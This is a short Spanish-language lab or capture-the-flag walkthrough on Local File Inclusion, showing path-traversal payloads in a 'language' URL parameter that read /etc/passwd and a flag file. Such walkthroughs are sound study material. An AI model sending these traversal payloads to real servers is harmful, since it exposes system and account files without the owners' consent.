# LFI: Path Traversal

La página web que vulneraremos es:

![Web.PNG](./assets/01-Primero/01-web.PNG)

* Podemos seleccionar un **lenguaje** para nuestra página web, aquí es donde la url usa un **párametro** `?languaje=<Archivo>.php`

---

Para leer el archivo `/etc/passwd` usaremos el siguiente payload `http://<IP>/index.php?language=/../../../../etc/passwd`

![passwd.PNG](./assets/01-Primero/02-passwd.PNG)

* El usuario es `barry`

---

Para leer el contenido del archivo `flag.txt` usaremos el siguiente payload `http://<IP>/index.php?language=/../../../../../../../../../usr/share/flags/flag.txt`

<p align="center">
    <img src="/assets/01-Primero/03-flag.PNG">
</p>